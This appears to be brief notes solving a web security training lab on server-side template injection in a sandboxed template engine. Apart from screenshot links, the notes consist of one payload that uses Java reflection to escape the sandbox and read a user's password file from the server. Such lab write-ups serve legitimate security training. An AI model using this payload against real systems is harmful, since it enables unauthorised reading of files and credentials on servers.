# EXPERT: Server-side template injection in a sandboxed environment

![Снимок экрана 2025-12-02 в 13.40.46.png](EXPERT%20Server-side%20template%20injection%20in%20a%20sandbox/%D0%A1%D0%BD%D0%B8%D0%BC%D0%BE%D0%BA_%D1%8D%D0%BA%D1%80%D0%B0%D0%BD%D0%B0_2025-12-02_%D0%B2_13.40.46.png)

```jsx
${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('../../home/carlos/my_password.txt').toURL().openStream().readAllBytes()?join(" ")}
```

![Снимок экрана 2025-12-02 в 13.42.07.png](EXPERT%20Server-side%20template%20injection%20in%20a%20sandbox/%D0%A1%D0%BD%D0%B8%D0%BC%D0%BE%D0%BA_%D1%8D%D0%BA%D1%80%D0%B0%D0%BD%D0%B0_2025-12-02_%D0%B2_13.42.07.png)

![Снимок экрана 2025-12-02 в 13.44.04.png](EXPERT%20Server-side%20template%20injection%20in%20a%20sandbox/%D0%A1%D0%BD%D0%B8%D0%BC%D0%BE%D0%BA_%D1%8D%D0%BA%D1%80%D0%B0%D0%BD%D0%B0_2025-12-02_%D0%B2_13.44.04.png)